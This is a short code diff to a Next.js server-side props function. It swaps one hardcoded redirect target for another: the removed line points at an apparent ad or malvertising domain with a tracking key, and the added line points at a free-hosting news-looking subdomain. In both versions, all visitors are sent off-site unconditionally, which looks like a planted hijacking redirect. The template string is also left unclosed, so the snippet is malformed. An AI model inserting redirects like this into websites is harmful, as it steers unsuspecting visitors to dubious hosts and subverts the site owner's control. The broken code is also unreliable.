@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://crevicedepressingpumpkin.com/c7dayriae?key=6457bd1ab353948044dc04f6c1b326a5
+					`https://newsdaily77.000webhostapp.com
 				}`,
 			},
 		};
